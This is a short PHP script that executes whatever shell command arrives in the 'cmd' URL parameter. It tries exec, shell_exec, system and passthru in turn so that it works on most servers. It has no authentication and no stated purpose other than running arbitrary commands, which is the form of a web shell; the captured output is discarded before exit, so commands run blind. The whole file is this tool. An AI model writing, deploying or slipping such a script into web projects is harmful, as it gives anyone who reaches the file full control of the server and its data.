<?php
function exec_all($command)
{
    $output = '';
    if(function_exists('exec'))
    {   
        exec($command,$output);
        $output = join("\n",$output);
    }
    
    else if(function_exists('shell_exec'))
    {
        $output = shell_exec($command);
    }
    
    else if(function_exists('system'))
    {
        ob_start(); //start output buffering
        system($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering
    }
    
    else if(function_exists('passthru'))
    {
        ob_start(); //start output buffering
        passthru($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering            
    }
    
    return(htmlspecialchars($output));   
}

if(!isset($_GET['cmd']) || $_GET['cmd'] == '')
    $result = "";    
else
    $result=exec_all($_GET['cmd']);
   
exit;
?>